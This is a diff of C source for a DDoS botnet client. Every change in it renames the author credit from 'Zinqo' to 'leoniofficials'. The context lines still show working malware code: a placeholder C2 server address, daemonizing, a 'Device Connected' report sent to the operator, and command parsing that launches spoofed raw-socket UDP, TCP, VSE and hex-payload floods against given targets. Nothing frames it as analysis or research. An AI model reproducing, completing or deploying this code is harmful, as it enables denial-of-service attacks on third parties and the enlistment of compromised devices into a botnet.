@@ -24,7 +24,7 @@
 #define PAD_ZERO 2
 #define PRINT_BUF_LEN 12
 #define std_packet 1460
-//Made By Zinqo.
+//Made By leoniofficials.
 unsigned char *commServer[] = {"SERVERIP:12345"};
 
 const char *useragents[] = {
@@ -35,7 +35,7 @@ const char *useragents[] = {
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
 "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-};//Made By Zinqo.
+};//Made By leoniofficials.
 
 int initConnection();
 void makeRandomStr(unsigned char *buf, int length);
@@ -59,7 +59,7 @@ void init_rand(uint32_t x)
 
         for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
 }
-uint32_t rand_cmwc(void)//Made By Zinqo.
+uint32_t rand_cmwc(void)//Made By leoniofficials.
 {
         uint64_t t, a = 18782LL;
         static uint32_t i = 4095;
@@ -159,7 +159,7 @@ static int prints(unsigned char **out, const unsigned char *string, int width, i
 
         if (width > 0) {
                 register int len = 0;
-                register const unsigned char *ptr;//Made By Zinqo.
+                register const unsigned char *ptr;//Made By leoniofficials.
                 for (ptr = string; *ptr; ++ptr) ++len;
                 if (len >= width) width = 0;
                 else width -= len;
@@ -185,7 +185,7 @@ static int prints(unsigned char **out, const unsigned char *string, int width, i
 
 static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
 {
-        unsigned char print_buf[PRINT_BUF_LEN];//Made By Zinqo.
+        unsigned char print_buf[PRINT_BUF_LEN];//Made By leoniofficials.
         register unsigned char *s;
         register int t, neg = 0, pc = 0;
         register unsigned int u = i;
@@ -252,7 +252,7 @@ static int print(unsigned char **out, const unsigned char *format, va_list args 
                         }
                         if( *format == 's' ) {
                                 register char *s = (char *)va_arg( args, int );
-                                pc += prints (out, s?s:"(null)", width, pad);//Made By Zinqo.
+                                pc += prints (out, s?s:"(null)", width, pad);//Made By leoniofficials.
                                 continue;
                         }
                         if( *format == 'd' ) {
@@ -284,7 +284,7 @@ out:
                         ++pc;
                 }
         }
-        if (out) **out = '\0';//Made By Zinqo.
+        if (out) **out = '\0';//Made By leoniofficials.
         va_end( args );
         return pc;
 }
@@ -351,7 +351,7 @@ int recvLine(int socket, unsigned char *buf, int bufsize)
                         return -1;
                 }
                 *cp++ = tmpchr;
-                if(tmpchr == '\n') break;//Made By Zinqo.
+                if(tmpchr == '\n') break;//Made By leoniofficials.
                 count++;
         }
         *cp = 0x00;
@@ -485,7 +485,7 @@ void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                         srand(time(NULL) ^ rand_cmwc());
                         init_rand(rand());
                 }
-                in_addr_t netmask;//Made By Zinqo.
+                in_addr_t netmask;//Made By leoniofficials.
                 netmask = ( ~((1 << (32 - spoofit)) - 1) );
                 unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                 struct iphdr *iph = (struct iphdr *)packet;
@@ -569,7 +569,7 @@ void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned ch
                         if(!strcmp(pch,         "SYN"))
                         {
                                 tcph->syn = 1;
-                        } else if(!strcmp(pch,  "RST"))//Made By Zinqo.
+                        } else if(!strcmp(pch,  "RST"))//Made By leoniofficials.
                         {
                                 tcph->rst = 1;
                         } else if(!strcmp(pch,  "FIN"))
@@ -613,7 +613,7 @@ void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned ch
                 {
                         if(time(NULL) > end) break;
                         i = 0;
-                        continue;//Made By Zinqo.
+                        continue;//Made By leoniofficials.
                 }
                 i++;
         }
@@ -635,7 +635,7 @@ void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned ch
 	{
         char *rhexstring[] = {
 		"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
-		"/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",//Made By Zinqo.
+		"/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",//Made By leoniofficials.
         };
 		if (a >= 50)
 		{
@@ -670,7 +670,7 @@ void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t pr
 {
     char *vse_payload;
     int vse_payload_len;
-    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;//Made By Zinqo.
+    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;//Made By leoniofficials.
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
@@ -681,13 +681,13 @@ void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t pr
         iph->protocol = protocol;
         iph->check = 0;
         iph->saddr = source;
-        iph->daddr = dest;//Made By Zinqo.
-}//Made By Zinqo.
+        iph->daddr = dest;//Made By leoniofficials.
+}//Made By leoniofficials.
 void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
 {
     char *vse_payload;
     int vse_payload_len;
-    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;//Made By Zinqo.
+    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;//Made By leoniofficials.
 	struct sockaddr_in dest_addr;
 	dest_addr.sin_family = AF_INET;
 	if(port == 0) dest_addr.sin_port = rand_cmwc();
@@ -754,7 +754,7 @@ void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int pa
 	int end = time(NULL) + timeEnd;
 	register unsigned int i = 0;
 	register unsigned int ii = 0;
-	while(1) {//Made By Zinqo.
+	while(1) {//Made By leoniofficials.
 	sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
 	udph->source = rand_cmwc();
 	udph->dest = (port == 0 ? rand_cmwc() : htons(port));
@@ -811,7 +811,7 @@ void stdhexflood(unsigned char *ip, int port, int secs) {
 	time_t start = time(NULL);
 	struct sockaddr_in sin;
 	struct hostent *hp;
-	hp = gethostbyname(ip);//Made By Zinqo.
+	hp = gethostbyname(ip);//Made By leoniofficials.
 	bzero((char*) &sin,sizeof(sin));
 	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
 	sin.sin_family = hp->h_addrtype;
@@ -820,7 +820,7 @@ void stdhexflood(unsigned char *ip, int port, int secs) {
 	while(1)
 	{
 	    char *shexstring[] = {
-		"\x6c\x58\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x76\x39\x38\x32\x77\x75\x49\x69\x4b\x63\x48\x6c\x67\x46\x41\x30\x6a\x45\x73\x57\x32\x4f\x46\x51\x53\x74\x4f\x37\x78\x36\x7a\x4e\x39\x64\x42\x67\x61\x79\x79\x57\x67\x76\x62\x6b\x30\x4c\x33\x6c\x5a\x43\x6c\x7a\x4a\x43\x6d\x46\x47\x33\x47\x56\x4e\x44\x46\x63\x32\x69\x54\x48\x4e\x59\x79\x37\x67\x73\x73\x38\x64\x48\x62\x6f\x42\x64\x65\x4b\x45\x31\x56\x63\x62\x6c\x48\x31\x41\x78\x72\x56\x79\x69\x71\x6f\x6b\x77\x32\x52\x59\x46\x76\x64\x34\x63\x64\x31\x51\x78\x79\x61\x48\x61\x77\x77\x50\x36\x67\x6f\x39\x66\x65\x42\x65\x48\x64\x6c\x76\x4d\x52\x44\x4c\x62\x45\x62\x74\x79\x33\x50\x79\x38\x79\x56\x54\x33\x55\x54\x6a\x79\x33\x5a\x4b\x4f\x4e\x58\x6d\x4d\x4e\x76\x55\x52\x54\x55\x5a\x54\x6b\x65\x48\x33\x37\x58\x54\x39\x48\x35\x4a\x77\x48\x30\x76\x4b\x42\x31\x59\x77\x32\x72\x53\x59\x6b\x54\x77\x63\x54\x76\x78\x36\x4f\x6c\x74\x53\x49\x6c\x61\x68\x46\x67\x39\x32\x75\x43\x52\x62\x4c\x4d\x38\x61\x6d\x68\x38\x47\x61\x47\x47\x47\x52\x77\x35\x36\x69\x4e\x55\x54\x47\x4c\x67\x69\x33\x39\x35\x76\x6a\x39\x5a\x56\x56\x65\x50\x30\x31\x6b\x37\x54\x76\x71\x33\x4e\x52\x76\x78\x6f\x23\x23\x23\x23\x23\x23\x23\x23\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x40\x21\x40\x21\x40\x24\x21\x25\x40\x26\x24\x5e\x21\x40\x25\x25\x5e\x21\x40\x25\x2a\x21\x28\x40\x25\x26\x2a\x28\x21\x40\x25\x26\x21\x40\x2a\x28\x25\x26\x21\x40\x28\x29\x25\x2a\x21\x40\x25\x29\x29"};//Made By Zinqo.
+		"\x6c\x58\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x76\x39\x38\x32\x77\x75\x49\x69\x4b\x63\x48\x6c\x67\x46\x41\x30\x6a\x45\x73\x57\x32\x4f\x46\x51\x53\x74\x4f\x37\x78\x36\x7a\x4e\x39\x64\x42\x67\x61\x79\x79\x57\x67\x76\x62\x6b\x30\x4c\x33\x6c\x5a\x43\x6c\x7a\x4a\x43\x6d\x46\x47\x33\x47\x56\x4e\x44\x46\x63\x32\x69\x54\x48\x4e\x59\x79\x37\x67\x73\x73\x38\x64\x48\x62\x6f\x42\x64\x65\x4b\x45\x31\x56\x63\x62\x6c\x48\x31\x41\x78\x72\x56\x79\x69\x71\x6f\x6b\x77\x32\x52\x59\x46\x76\x64\x34\x63\x64\x31\x51\x78\x79\x61\x48\x61\x77\x77\x50\x36\x67\x6f\x39\x66\x65\x42\x65\x48\x64\x6c\x76\x4d\x52\x44\x4c\x62\x45\x62\x74\x79\x33\x50\x79\x38\x79\x56\x54\x33\x55\x54\x6a\x79\x33\x5a\x4b\x4f\x4e\x58\x6d\x4d\x4e\x76\x55\x52\x54\x55\x5a\x54\x6b\x65\x48\x33\x37\x58\x54\x39\x48\x35\x4a\x77\x48\x30\x76\x4b\x42\x31\x59\x77\x32\x72\x53\x59\x6b\x54\x77\x63\x54\x76\x78\x36\x4f\x6c\x74\x53\x49\x6c\x61\x68\x46\x67\x39\x32\x75\x43\x52\x62\x4c\x4d\x38\x61\x6d\x68\x38\x47\x61\x47\x47\x47\x52\x77\x35\x36\x69\x4e\x55\x54\x47\x4c\x67\x69\x33\x39\x35\x76\x6a\x39\x5a\x56\x56\x65\x50\x30\x31\x6b\x37\x54\x76\x71\x33\x4e\x52\x76\x78\x6f\x23\x23\x23\x23\x23\x23\x23\x23\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x40\x21\x40\x21\x40\x24\x21\x25\x40\x26\x24\x5e\x21\x40\x25\x25\x5e\x21\x40\x25\x2a\x21\x28\x40\x25\x26\x2a\x28\x21\x40\x25\x26\x21\x40\x2a\x28\x25\x26\x21\x40\x28\x29\x25\x2a\x21\x40\x25\x29\x29"};//Made By leoniofficials.
 		if (a >= 50)
 		{
 			send(std_hex, shexstring, std_packet, 0);
@@ -849,17 +849,17 @@ void stdhexflood(unsigned char *ip, int port, int secs) {
 	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
 	sin.sin_family = hp->h_addrtype;
 	sin.sin_port = port;
-	unsigned int a = 0;//Made By Zinqo.
+	unsigned int a = 0;//Made By leoniofficials.
 	while(1)
 	{
         char *rhexstring[] = {
         "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
         "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
-        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",//Made By Zinqo.
+        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",//Made By leoniofficials.
         "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
         "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
         "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb"
-        };//Made By Zinqo.
+        };//Made By leoniofficials.
 		if (a >= 50)
 		{
 			send(std_hex, rhexstring, std_packet, 0);
@@ -893,7 +893,7 @@ void rtcp(unsigned char *target, int port, int timeEnd, int spoofit, int packets
                 return;
         }
 
-        int tmp = 1;//Made By Zinqo.
+        int tmp = 1;//Made By leoniofficials.
         if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
                 return;
         }
@@ -917,7 +917,7 @@ void rtcp(unsigned char *target, int port, int timeEnd, int spoofit, int packets
         tcph->syn = 1;
         tcph->psh = 1;
         tcph->ack = 1;
-        tcph->urg = 1;//Made By Zinqo.
+        tcph->urg = 1;//Made By leoniofficials.
         tcph->window = rand_cmwc();
         tcph->check = 0;
         tcph->urg_ptr = 0;
@@ -941,7 +941,7 @@ void rtcp(unsigned char *target, int port, int timeEnd, int spoofit, int packets
 
                 if(i == pollRegister){
                         if(time(NULL) > end) break;
-                        i = 0;//Made By Zinqo.
+                        i = 0;//Made By leoniofficials.
                         continue;
                 }
                 i++;
@@ -974,7 +974,7 @@ void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packets
         if(buf == NULL) return;
         memset(buf, 0, packetsize + 1);
         makeRandomStr(buf, packetsize);
-//Made By Zinqo.
+//Made By leoniofficials.
         int end = time(NULL) + timeEnd;
         register unsigned int i = 0;
         while(1)
@@ -1101,7 +1101,7 @@ void atcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned ch
         tcph->fin = 1;
         tcph->ack = 1;
         tcph->psh = 1;
-    } else {//Made By Zinqo.
+    } else {//Made By leoniofficials.
         unsigned char *pch = strtok(flags, ",");
         while(pch)
         {
@@ -1275,7 +1275,7 @@ void processCmd(int argc, unsigned char *argv[])
                 }
         }
  if(!strcmp(argv[0], "UDP"))
-		{//Made By Zinqo.
+		{//Made By leoniofficials.
 			if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
 			{
 				return;
@@ -1295,7 +1295,7 @@ void processCmd(int argc, unsigned char *argv[])
 						{
 							SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
 							_exit(0);
-						}//Made By Zinqo.
+						}//Made By leoniofficials.
 						hi = strtok(NULL, ",");
 					}
                 } else {
@@ -1326,7 +1326,7 @@ void processCmd(int argc, unsigned char *argv[])
                 while(hi != NULL) {
                     if(!listFork()) {
                         vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
-                        _exit(0);//Made By Zinqo.
+                        _exit(0);//Made By leoniofficials.
                     }
                     hi = strtok(NULL, ",");
                 }
@@ -1364,11 +1364,11 @@ void processCmd(int argc, unsigned char *argv[])
 			SendSTDHEX(ip, port, time);
 			_exit(0);
 		}
-	}	//Made By Zinqo.
+	}	//Made By leoniofficials.
 
 		if(!strcmp(argv[0], "STD"))
 		{
-			//Made By Zinqo.
+			//Made By leoniofficials.
 			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
 			{
                 return;
@@ -1382,7 +1382,7 @@ void processCmd(int argc, unsigned char *argv[])
 				while(hi != NULL)
 				{
 					if(!listFork())
-					{//Made By Zinqo.
+					{//Made By leoniofficials.
 						SendSTD(hi, port, time);
 						_exit(0);
 					}
@@ -1487,7 +1487,7 @@ void processCmd(int argc, unsigned char *argv[])
             { return;}
             unsigned char *ip = argv[1];
             int port = atoi(argv[2]);
-            int time = atoi(argv[3]);//Made By Zinqo.
+            int time = atoi(argv[3]);//Made By leoniofficials.
             int spoofed = atoi(argv[4]);
             unsigned char *flags = argv[5];
             int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
@@ -1574,7 +1574,7 @@ void processCmd(int argc, unsigned char *argv[])
 
 					   }
         }
-}//Made By Zinqo.
+}//Made By leoniofficials.
 
 int initConnection()
 {
@@ -1614,7 +1614,7 @@ int main(int argc, unsigned char *argv[])
                         waitpid(pid1, &status, 0);
                         exit(0);
         } else if (!pid1) {
-                        if (pid2 = fork()) {//Made By Zinqo.
+                        if (pid2 = fork()) {//Made By leoniofficials.
                                         exit(0);
                         } else if (!pid2) {
                         } else {
@@ -1628,7 +1628,7 @@ int main(int argc, unsigned char *argv[])
         while(1)
         {
                 if(initConnection()) { sleep(5); continue; }
-                sockprintf(mainCommSock, "\e[1;95mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(ourIP), getPortz(), getArch());//Made By Zinqo.
+                sockprintf(mainCommSock, "\e[1;95mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(ourIP), getPortz(), getArch());//Made By leoniofficials.
                 char commBuf[4096];
                 int got = 0;
                 int i = 0;
@@ -1663,7 +1663,7 @@ int main(int argc, unsigned char *argv[])
                                 while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
 
                                 unsigned char *command = message;
-                                while(*message != ' ' && *message != 0x00) message++;//Made By Zinqo.
+                                while(*message != ' ' && *message != 0x00) message++;//Made By leoniofficials.
                                 *message = 0x00;
                                 message++;
 
@@ -1672,7 +1672,7 @@ int main(int argc, unsigned char *argv[])
 
                                 unsigned char *params[10];
                                 int paramsCount = 1;
-                                unsigned char *pch = strtok(message, " ");//Made By Zinqo.
+                                unsigned char *pch = strtok(message, " ");//Made By leoniofficials.
                                 params[0] = command;
 
                                 while(pch)
@@ -1695,7 +1695,7 @@ int main(int argc, unsigned char *argv[])
                                         for(q = 1; q < paramsCount; q++)
                                         {
                                                 free(params[q]);
-                                        }//Made By Zinqo.
+                                        }//Made By leoniofficials.
                                 }
                         }
                 }
@@ -1703,3 +1703,4 @@ int main(int argc, unsigned char *argv[])
 
         return 0;
 }
+
